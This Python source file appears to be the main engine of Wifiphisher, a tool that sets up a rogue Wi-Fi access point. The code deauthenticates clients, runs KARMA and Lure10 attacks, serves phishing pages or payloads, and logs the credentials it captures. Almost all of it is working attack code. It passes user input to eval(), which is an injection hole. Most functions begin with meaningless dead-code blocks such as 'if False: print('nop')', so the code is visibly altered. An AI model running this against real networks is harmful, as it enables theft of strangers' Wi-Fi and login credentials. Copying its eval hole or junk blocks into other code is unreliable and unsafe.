import argparse
import curses
import fcntl
import logging
import logging.config
import os
import signal
import socket
import struct
import subprocess
import sys
import time
from shutil import copyfile
from subprocess import PIPE, Popen, check_output
from threading import Thread
import wifiphisher.common.accesspoint as accesspoint
import wifiphisher.common.extensions as extensions
import wifiphisher.common.firewall as firewall
import wifiphisher.common.globals as universal
import wifiphisher.common.interfaces as interfaces
import wifiphisher.common.macmatcher as macmatcher
import wifiphisher.common.opmode as opmode
import wifiphisher.common.phishinghttp as phishinghttp
import wifiphisher.common.phishingpage as phishingpage
import wifiphisher.common.recon as recon
import wifiphisher.common.tui as tui
import wifiphisher.common.victim as victim
from six.moves import range, input
from wifiphisher.common.constants import BIRTHDAY, CHANNEL, DEAUTH_EXTENSION, DEFAULT_EXTENSIONS, DEV, DN, G, HANDSHAKE_VALIDATE_EXTENSION, INTERFERING_PROCS, KNOWN_BEACONS_EXTENSION, LOGGING_CONFIG, LURE10_EXTENSION, MAC_PREFIX_FILE, NETWORK_GW_IP, NEW_YEAR, O, PORT, R, ROGUEHOSTAPDINFO, SSL_PORT, T, W, WEBSITE, WPSPBC
logger = logging.getLogger(__name__)

def parse_args():
    if False:
        for i in range(10):
            print('nop')
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', help='Manually choose an interface that supports both AP and monitor ' + 'modes for spawning the rogue AP as well as mounting additional ' + 'Wi-Fi attacks from Extensions (i.e. deauth). ' + 'Example: -i wlan1')
    parser.add_argument('-eI', '--extensionsinterface', help='Manually choose an interface that supports monitor mode for ' + 'deauthenticating the victims. ' + 'Example: -eI wlan1')
    parser.add_argument('-aI', '--apinterface', type=opmode.validate_ap_interface, help='Manually choose an interface that supports AP mode for  ' + 'spawning the rogue AP. ' + 'Example: -aI wlan0')
    parser.add_argument('-iI', '--internetinterface', help='Choose an interface that is connected on the Internet' + 'Example: -iI ppp0')
    parser.add_argument('-pI', '--protectinterface', nargs='+', help='Specify the interface(s) that will have their connection protected (i.e. NetworkManager will be prevented from controlling them). ' + 'Example: -pI wlan1 wlan2')
    parser.add_argument('-mI', '--mitminterface', help='Choose an interface that is connected on the Internet in order to perform a MITM attack. All other interfaces will be protected.' + 'Example: -mI wlan1')
    parser.add_argument('-iAM', '--mac-ap-interface', help='Specify the MAC address of the AP interface')
    parser.add_argument('-iEM', '--mac-extensions-interface', help='Specify the MAC address of the extensions interface')
    parser.add_argument('-iNM', '--no-mac-randomization', help='Do not change any MAC address', action='store_true')
    parser.add_argument('-kN', '--keepnetworkmanager', action='store_true', help='Do not kill NetworkManager')
    parser.add_argument('-nE', '--noextensions', help='Do not load any extensions.', action='store_true')
    parser.add_argument('-nD', '--nodeauth', help='Skip the deauthentication phase.', action='store_true')
    parser.add_argument('-dC', '--deauth-channels', nargs='+', type=int, help='Channels to deauth. ' + 'Example: --deauth-channels 1,3,7')
    parser.add_argument('-e', '--essid', help='Enter the ESSID of the rogue Access Point. ' + 'This option will skip Access Point selection phase. ' + "Example: --essid 'Free WiFi'")
    parser.add_argument('-dE', '--deauth-essid', help='Deauth all the BSSIDs in the WLAN with that ESSID.')
    parser.add_argument('-p', '--phishingscenario', help='Choose the phishing scenario to run.' + 'This option will skip the scenario selection phase. ' + 'Example: -p firmware_upgrade')
    parser.add_argument('-pK', '--presharedkey', help='Add WPA/WPA2 protection on the rogue Access Point. ' + 'Example: -pK s3cr3tp4ssw0rd')
    parser.add_argument('-hC', '--handshake-capture', help='Capture of the WPA/WPA2 handshakes for verifying passphrase. ' + 'Requires cowpatty. ' + 'Example : -hC capture.pcap')
    parser.add_argument('-qS', '--quitonsuccess', help='Stop the script after successfully retrieving one pair of credentials', action='store_true')
    parser.add_argument('-lC', '--lure10-capture', help='Capture the BSSIDs of the APs that are discovered during AP selection phase. This option is part of Lure10 attack.', action='store_true')
    parser.add_argument('-lE', '--lure10-exploit', help='Fool the Windows Location Service of nearby Windows users to believe it is within an area that was previously captured with --lure10-capture. Part of the Lure10 attack.')
    parser.add_argument('--logging', help='Log activity to file', action='store_true')
    parser.add_argument('-dK', '--disable-karma', help='Disables KARMA attack', action='store_true')
    parser.add_argument('-lP', '--logpath', default=None, help='Determine the full path of the logfile.')
    parser.add_argument('-cP', '--credential-log-path', help='Determine the full path of the file that will store any captured credentials', default=None)
    parser.add_argument('--payload-path', help='Payload path for scenarios serving a payload')
    parser.add_argument('-cM', '--channel-monitor', help='Monitor if target access point changes the channel.', action='store_true')
    parser.add_argument('-wP', '--wps-pbc', help='Monitor if the button on a WPS-PBC Registrar is pressed.', action='store_true')
    parser.add_argument('-wAI', '--wpspbc-assoc-interface', help='The WLAN interface used for associating to the WPS AccessPoint.')
    parser.add_argument('-kB', '--known-beacons', help='Broadcast a number of beacon frames advertising popular WLANs', action='store_true')
    parser.add_argument('-fH', '--force-hostapd', help='Force the usage of hostapd installed in the system', action='store_true')
    parser.add_argument('-pPD', '--phishing-pages-directory', help='Search for phishing pages in this location')
    parser.add_argument('--dnsmasq-conf', help='Determine the full path of a custom dnmasq.conf file', default='/tmp/dnsmasq.conf')
    parser.add_argument('-pE', '--phishing-essid', help='Determine the ESSID you want to use for the phishing page')
    return parser.parse_args()
VERSION = '1.4GIT'
args = parse_args()
APs = {}

def setup_logging(args):
    if False:
        return 10
    '\n    Setup the logging configurations\n    '
    root_logger = logging.getLogger()
    if args.logging:
        if args.logpath:
            LOGGING_CONFIG['handlers']['file']['filename'] = args.logpath
        logging.config.dictConfig(LOGGING_CONFIG)
        should_roll_over = False
        if os.path.getsize(LOGGING_CONFIG['handlers']['file']['filename']) > 0:
            should_roll_over = os.path.isfile(LOGGING_CONFIG['handlers']['file']['filename'])
        should_roll_over and root_logger.handlers[0].doRollover()
        logger.info('Starting Wifiphisher')

def set_ip_fwd():
    if False:
        i = 10
        return i + 15
    '\n    Set kernel variables.\n    '
    Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'], stdout=DN, stderr=PIPE)

def set_route_localnet():
    if False:
        return 10
    '\n    Set kernel variables.\n    '
    Popen(['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'], stdout=DN, stderr=PIPE)

def set_channel_range():
    if False:
        print('Hello World!')
    '\n    Set channel range accordingly.\n    '
    region = time.tzname[time.daylight]
    if 'JST' in region:
        print('[' + G + '+' + W + '] ' + 'JST timezone detected. ' + 'Setting channel range to 1-14')
        universal.ALL_2G_CHANNELS = list(range(1, 15))
        return
    print('[' + G + '+' + W + '] ' + 'Timezone detected. ' + 'Setting channel range to 1-13')
    universal.ALL_2G_CHANNELS = list(range(1, 14))
    return

def kill_interfering_procs():
    if False:
        while True:
            i = 10
    '\n    Kill the interfering processes that may interfere the wireless card\n    :return None\n    :rtype None\n    ..note: The interfering processes are referenced by airmon-zc.\n    '
    try:
        subprocess.Popen(['service', 'network-manager', 'stop'], stdout=subprocess.PIPE, stderr=DN)
        subprocess.Popen(['service', 'NetworkManager', 'stop'], stdout=subprocess.PIPE, stderr=DN)
        subprocess.Popen(['service', 'avahi-daemon', 'stop'], stdout=subprocess.PIPE, stderr=DN)
    except OSError:
        pass
    proc = Popen(['ps', '-A'], stdout=subprocess.PIPE)
    output = proc.communicate()[0]
    sys_procs = output.splitlines()
    for interfering_proc in INTERFERING_PROCS:
        for proc in sys_procs:
            if interfering_proc in proc.decode('utf-8'):
                pid = int(proc.split(None, 1)[0])
                print('[' + G + '+' + W + '] Sending SIGKILL to ' + interfering_proc)
                os.kill(pid, signal.SIGKILL)

class WifiphisherEngine:

    def __init__(self):
        if False:
            print('Hello World!')
        self.mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
        self.network_manager = interfaces.NetworkManager()
        self.template_manager = phishingpage.TemplateManager()
        self.access_point = accesspoint.AccessPoint()
        self.fw = firewall.Fw()
        self.em = extensions.ExtensionManager(self.network_manager)
        self.opmode = opmode.OpMode()
        self.victim = victim.Victims()

    def stop(self):
        if False:
            return 10
        if DEV:
            print('[' + G + '+' + W + '] Show your support!')
            print('[' + G + '+' + W + '] Follow us: https://twitter.com/wifiphisher')
            print('[' + G + '+' + W + '] Like us: https://www.facebook.com/Wifiphisher')
        print('[' + G + '+' + W + '] Captured credentials:')
        for cred in phishinghttp.creds:
            logger.info('Credentials: %s', cred)
            print(cred)
        self.em.on_exit()
        self.access_point.on_exit()
        try:
            self.network_manager.on_exit()
        except interfaces.InvalidMacAddressError as err:
            print('[{0}!{1}] {2}'.format(R, W, err))
        self.template_manager.on_exit()
        self.fw.on_exit()
        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
            os.remove('/tmp/wifiphisher-webserver.tmp')
        print('[' + R + '!' + W + '] Closing')
        sys.exit(0)

    def start(self):
        if False:
            while True:
                i = 10
        today = time.strftime('%Y-%m-%d %H:%M')
        print('[' + T + '*' + W + '] Starting Wifiphisher %s ( %s ) at %s' % (VERSION, WEBSITE, today))
        if BIRTHDAY in today:
            print('[' + T + '*' + W + '] Wifiphisher was first released on this day in 2015! Happy birthday!')
        if NEW_YEAR in today:
            print('[' + T + '*' + W + '] Happy new year!')
        if os.geteuid():
            logger.error('Non root user detected')
            sys.exit('[' + R + '-' + W + '] Please run as root')
        set_channel_range()
        global args, APs
        args = parse_args()
        setup_logging(args)
        if args.phishing_pages_directory:
            if args.phishing_pages_directory[-1] != os.path.sep:
                args.phishing_pages_directory += os.path.sep
            phishing_pages_dir = args.phishing_pages_directory
            logger.info('Searching for scenario in %s' % phishing_pages_dir)
        if args.dnsmasq_conf:
            self.access_point.dns_conf_path = args.dnsmasq_conf
        if args.credential_log_path:
            phishinghttp.credential_log_path = args.credential_log_path
        if args.mitminterface:
            if args.internetinterface:
                (args.internetinterface, args.mitminterface) = (args.mitminterface, args.internetinterface)
            else:
                args.internetinterface = args.mitminterface
                args.mitminterface = 'handledAsInternetInterface'
        self.opmode.initialize(args)
        self.opmode.set_opmode(args, self.network_manager)
        self.network_manager.start(args)
        try:
            if self.opmode.internet_sharing_enabled():
                self.network_manager.internet_access_enable = True
                if args.mitminterface:
                    for interface in self.network_manager._name_to_object:
                        if interface != args.internetinterface:
                            self.network_manager.nm_unmanage(interface)
                if self.network_manager.is_interface_valid(args.internetinterface, 'internet'):
                    internet_interface = args.internetinterface
                    if interfaces.is_wireless_interface(internet_interface):
                        try:
                            self.network_manager.unblock_interface(internet_interface)
                        except KeyError:
                            logger.warning("Interface {} does not support 'nl80211'. In case it is blocked,                                    you must unblock it manually".format(internet_interface))
                logger.info('Selecting %s interface for accessing internet', args.internetinterface)
            if self.opmode.assoc_enabled():
                if self.network_manager.is_interface_valid(args.wpspbc_assoc_interface, 'WPS'):
                    logger.info('Selecting %s interface for WPS association', args.wpspbc_assoc_interface)
            if self.opmode.extensions_enabled():
                if args.extensionsinterface and args.apinterface:
                    if self.network_manager.is_interface_valid(args.extensionsinterface, 'monitor'):
                        mon_iface = args.extensionsinterface
                        self.network_manager.unblock_interface(mon_iface)
                    if self.network_manager.is_interface_valid(args.apinterface, 'AP'):
                        ap_iface = args.apinterface
                else:
                    (mon_iface, ap_iface) = self.network_manager.get_interface_automatically()
                logger.info('Selecting {} for deauthentication and {} for the rogue Access Point'.format(mon_iface, ap_iface))
                print('[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the rogue Access Point'.format(G, W, mon_iface, ap_iface))
            if not self.opmode.extensions_enabled():
                if args.apinterface:
                    if self.network_manager.is_interface_valid(args.apinterface, 'AP'):
                        ap_iface = args.apinterface
                else:
                    ap_iface = self.network_manager.get_interface(True, False)
                mon_iface = ap_iface
                print('[{0}+{1}] Selecting {0}{2}{1} interface for creating the rogue Access Point'.format(G, W, ap_iface))
                logger.info('Selecting {} interface for rogue Access Point'.format(ap_iface))
            if not args.no_mac_randomization:
                try:
                    new_mac = self.network_manager.set_interface_mac(ap_iface, args.mac_ap_interface)
                    logger.info('Changing {} MAC address to {}'.format(ap_iface, new_mac))
                    print('[{0}+{1}] Changing {2} MAC addr (BSSID) to {3}'.format(G, W, ap_iface, new_mac))
                    if mon_iface != ap_iface:
                        new_mac = self.network_manager.set_interface_mac(mon_iface, args.mac_extensions_interface)
                        logger.info('Changing {} MAC address to {}'.format(mon_iface, new_mac))
                        print('[{0}+{1}] Changing {2} MAC addr (BSSID) to {3}'.format(G, W, ap_iface, new_mac))
                except interfaces.InvalidMacAddressError as err:
                    print('[{0}!{1}] {2}'.format(R, W, err))
            logger.info('Unblocking interfaces')
            self.network_manager.unblock_interface(ap_iface)
            self.network_manager.unblock_interface(mon_iface)
            if self.opmode.extensions_enabled() or args.essid is None:
                self.network_manager.set_interface_mode(mon_iface, 'monitor')
        except (interfaces.InvalidInterfaceError, interfaces.InterfaceCantBeFoundError, interfaces.InterfaceManagedByNetworkManagerError) as err:
            logging.exception('The following error has occurred:')
            print('[{0}!{1}] {2}'.format(R, W, err))
            time.sleep(1)
            self.stop()
        if args.protectinterface:
            for interface in args.protectinterface:
                self.network_manager.nm_unmanage(interface)
        if not args.internetinterface and (not args.keepnetworkmanager):
            kill_interfering_procs()
            logger.info('Killing all interfering processes')
        if self.opmode.internet_sharing_enabled():
            self.fw.nat(ap_iface, args.internetinterface)
            set_ip_fwd()
        else:
            self.fw.redirect_requests_localhost()
        set_route_localnet()
        print('[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables')
        time.sleep(1)
        if args.essid:
            essid = args.essid
            channel = str(CHANNEL)
            target_ap_mac = None
            enctype = None
        else:
            self.network_manager.up_interface(mon_iface)
            ap_info_object = tui.ApSelInfo(mon_iface, self.mac_matcher, self.network_manager, args)
            ap_sel_object = tui.TuiApSel()
            access_point = curses.wrapper(ap_sel_object.gather_info, ap_info_object)
            if access_point:
                essid = access_point.name
                channel = access_point.channel
                target_ap_mac = access_point.mac_address
                enctype = access_point.encryption
            else:
                self.stop()
        self.template_manager = phishingpage.TemplateManager(data_pages=args.phishing_pages_directory)
        tui_template_obj = tui.TuiTemplateSelection()
        template = tui_template_obj.gather_info(args.phishingscenario, self.template_manager)
        logger.info('Selecting {} template'.format(template.get_display_name()))
        print('[' + G + '+' + W + '] Selecting ' + template.get_display_name() + ' template')
        if template.has_payload():
            payload_path = args.payload_path
            while not payload_path or not os.path.isfile(payload_path):
                payload_path = eval(input('[' + G + '+' + W + '] Enter the [' + G + 'full path' + W + '] to the payload you wish to serve: '))
                if not os.path.isfile(payload_path):
                    print('[' + R + '-' + W + '] Invalid file path!')
            print('[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload ')
            template.update_payload_path(os.path.basename(payload_path))
            copyfile(payload_path, self.template_manager.template_directory + template.get_payload_path())
        APs_context = []
        for i in APs:
            APs_context.append({'channel': APs[i][0] or '', 'essid': APs[i][1] or '', 'bssid': APs[i][2] or '', 'vendor': self.mac_matcher.get_vendor_name(APs[i][2]) or ''})
        template.merge_context({'APs': APs_context})
        ap_logo_path = False
        if target_ap_mac is not None:
            ap_logo_path = template.use_file(self.mac_matcher.get_vendor_logo_path(target_ap_mac))
        template.merge_context({'target_ap_channel': channel or '', 'target_ap_essid': args.phishing_essid or essid or '', 'target_ap_bssid': target_ap_mac or '', 'target_ap_encryption': enctype or '', 'target_ap_vendor': self.mac_matcher.get_vendor_name(target_ap_mac) or '', 'target_ap_logo_path': ap_logo_path or ''})
        if args.wps_pbc:
            template.merge_context({'wps_pbc_attack': '1'})
        else:
            template.merge_context({'wps_pbc_attack': '0'})
        self.network_manager.set_interface_mode(ap_iface, 'managed')
        self.network_manager.up_interface(ap_iface)
        self.access_point.interface = ap_iface
        self.access_point.channel = channel
        self.access_point.essid = essid
        if args.force_hostapd:
            print('[' + T + '*' + W + '] Using hostapd instead of roguehostapd. Many significant features will be turned off.')
            self.access_point.force_hostapd = True
        if args.wpspbc_assoc_interface:
            wps_mac = self.network_manager.get_interface_mac(args.wpspbc_assoc_interface)
            self.access_point.deny_mac_addrs.append(wps_mac)
        if args.presharedkey:
            self.access_point.presharedkey = args.presharedkey
        if self.opmode.internet_sharing_enabled():
            self.access_point.internet_interface = args.internetinterface
        print('[' + T + '*' + W + '] Starting the fake access point...')
        try:
            self.access_point.start(disable_karma=args.disable_karma)
            self.access_point.start_dhcp_dns()
        except BaseException as e:
            if hasattr(e, 'message'):
                print(e.message)
            else:
                print(e)
            self.stop()
        if self.opmode.extensions_enabled():
            shared_data = {'is_freq_hop_allowed': self.opmode.freq_hopping_enabled(), 'target_ap_channel': channel or '', 'target_ap_essid': essid or '', 'target_ap_bssid': target_ap_mac or '', 'target_ap_encryption': enctype or '', 'target_ap_logo_path': ap_logo_path or '', 'rogue_ap_essid': essid or '', 'rogue_ap_mac': self.network_manager.get_interface_mac(ap_iface), 'roguehostapd': self.access_point.hostapd_object, 'APs': APs_context, 'args': args}
            self.network_manager.up_interface(mon_iface)
            self.em.set_interface(mon_iface)
            extensions = DEFAULT_EXTENSIONS
            if args.lure10_exploit:
                extensions.append(LURE10_EXTENSION)
            if args.handshake_capture:
                extensions.append(HANDSHAKE_VALIDATE_EXTENSION)
            if args.nodeauth:
                extensions.remove(DEAUTH_EXTENSION)
            if args.wps_pbc:
                extensions.append(WPSPBC)
            if args.known_beacons:
                extensions.append(KNOWN_BEACONS_EXTENSION)
            if not args.force_hostapd:
                extensions.append(ROGUEHOSTAPDINFO)
            self.em.set_extensions(extensions)
            self.em.init_extensions(shared_data)
            self.em.start_extensions()
        if not self.opmode.internet_sharing_enabled():
            print('[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ', ' + str(SSL_PORT))
            webserver = Thread(target=phishinghttp.runHTTPServer, args=(NETWORK_GW_IP, PORT, SSL_PORT, template, self.em))
            webserver.daemon = True
            webserver.start()
            time.sleep(1.5)
        self.mac_matcher.unbind()
        clients_APs = []
        APs = []
        try:
            main_info = tui.MainInfo(VERSION, essid, channel, ap_iface, self.em, phishinghttp, args)
            tui_main_object = tui.TuiMain()
            curses.wrapper(tui_main_object.gather_info, main_info)
            self.stop()
        except KeyboardInterrupt:
            self.stop()

def run():
    if False:
        while True:
            i = 10
    try:
        engine = WifiphisherEngine()
        engine.start()
    except KeyboardInterrupt:
        print(R + '\n (^C)' + O + ' interrupted\n' + W)
        engine.stop()
    except EOFError:
        print(R + '\n (^D)' + O + ' interrupted\n' + W)